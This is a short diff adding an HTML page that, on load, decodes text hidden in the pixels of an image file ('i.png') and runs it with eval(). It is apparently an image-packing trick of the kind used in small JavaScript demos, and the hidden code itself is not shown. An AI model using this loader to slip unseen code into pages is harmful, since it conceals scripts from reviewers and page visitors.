@@ -1,0 +1,16 @@
+<body onload="
+W=new Image();
+W.onload=function(){
+c=document.getElementById('1').getContext('2d');
+c.drawImage(W,0,0);
+p=c.getImageData(0,0,640,4).data;
+Z='';
+i=0;
+while(!/\/\//.test(Z)){
+Z+=String.fromCharCode(p[i++*4])
+}
+eval(Z)
+}
+;
+W.src='i.png'">
+<canvas width=640 height=480 id=1></canvas>
